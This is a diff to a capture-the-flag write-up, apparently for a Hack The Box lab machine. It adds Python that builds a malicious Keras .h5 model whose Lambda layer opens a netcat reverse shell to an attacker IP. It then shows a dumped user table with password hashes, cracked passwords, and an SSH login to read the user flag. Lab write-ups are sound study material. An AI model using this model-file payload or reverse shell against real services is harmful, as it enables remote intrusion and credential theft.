@@ -48,13 +48,51 @@ After registering and logging in, we can access the `/dashboard` page. The dashb
 
 We can generate a malicious `.h5` file that contains a payload to execute arbitrary code. We will use this github repository, `https://github.com/Splinter0/tensorflow-rce` to create the file.
 
+We add use the docker image provided in the repository to generate the `.h5` file:
+```bash
+import tensorflow as tf
 
-[TO_CONTINUE]
-We upload the generated `.h5` file to the web application. 
+def exploit(x):
+    import os
+    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.90 4444 >/tmp/f")
+    return x
 
+model = tf.keras.Sequential()
+model.add(tf.keras.layers.Input(shape=(64,)))
+model.add(tf.keras.layers.Lambda(exploit))
+model.compile()
+model.save("exploit.h5")
+```
 
+We upload the generated `.h5` file to the web application. The application processes the file and executes the payload, which opens a reverse shell to our machine. 
 
+We can read the database and find all users and their hashed passwords. The database is stored in a file called `instance/users.db`.
+``` 
+1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
+2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
+3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
+4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
+5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
+```
 
+We use `https://crackstation.net/` to crack the password hashes. After cracking, we find the following credentials
+```bash
+gael:mattp005numbertwo
+royer:marwinnarak043414036
+```
+
+We use gael's credentials to log in though SSH:
+```bash
+ssh gael@artificial.htb
+```
+
+Then, we can read the user flag:
+```bash
+cat /home/gael/user.txt
+```
+```
+user flag value
+```
 
 ## Root Privilege Escalation
 
